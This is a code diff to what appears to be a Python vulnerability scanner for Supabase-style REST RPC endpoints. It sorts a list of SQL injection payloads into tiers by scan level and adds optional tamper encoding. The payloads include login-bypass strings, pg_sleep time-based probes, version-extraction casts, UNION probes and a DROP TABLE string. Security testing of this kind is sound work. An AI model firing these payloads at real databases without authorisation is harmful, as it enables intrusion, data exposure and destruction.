@@ -174,23 +174,51 @@ class RPCScanner(BaseScanner):
                     if result["sqli_suspected"]: break
         return result
     def get_advanced_sqli_payloads(self) -> List[str]:
-        return [
+        level = self.client.config.level
+        payloads = [
             "'", "\"", 
             "' OR 1=1 --", 
             "' OR '1'='1", 
             "\" OR \"1\"=\"1",
-            "' AND 1=cast((SELECT version()) as int)--",
-            "' OR 1=cast((SELECT version()) as int)--",
-            "'; SELECT pg_sleep(5)--",
-            "'; SELECT pg_sleep(5); --",
-            "' OR pg_sleep(5)--",
-            "\" OR pg_sleep(5)--",
-            "; DROP TABLE non_existent_table; --",
-            "$$ OR 1=1 --$$",
-            "$quote$ OR 1=1 --$quote$",
-            "'/**/OR/**/1=1/**/--",
-            "{\"a\": 1} OR 1=1",
         ]
+        
+        if level >= 2:
+            payloads.extend([
+                "' AND 1=cast((SELECT version()) as int)--",
+                "' OR 1=cast((SELECT version()) as int)--",
+                "'; SELECT pg_sleep(5)--",
+                "'; SELECT pg_sleep(5); --",
+            ])
+            
+        if level >= 3:
+            payloads.extend([
+                "' OR pg_sleep(5)--",
+                "\" OR pg_sleep(5)--",
+                "; DROP TABLE non_existent_table; --",
+                "$$ OR 1=1 --$$",
+                "$quote$ OR 1=1 --$quote$",
+            ])
+            
+        if level >= 4:
+            payloads.extend([
+                "'/**/OR/**/1=1/**/--",
+                "{\"a\": 1} OR 1=1",
+                "' UNION SELECT NULL, NULL, NULL--",
+            ])
+            
+        if level >= 5:
+            payloads.extend([
+                "admin' --",
+                "admin' #",
+                "' OR '1'='1' /*",
+            ])
+
+        if self.client.config.tamper:
+            from core.tamper import TamperManager
+            tm = TamperManager(self.client.config.tamper)
+            payloads = [tm.tamper(p) for p in payloads]
+
+        return payloads
     async def fuzz_logic(self, rpc: Dict, result: Dict):
         endpoint = f"/rest/v1/rpc/{rpc['name']}"
         sensitive_params = {
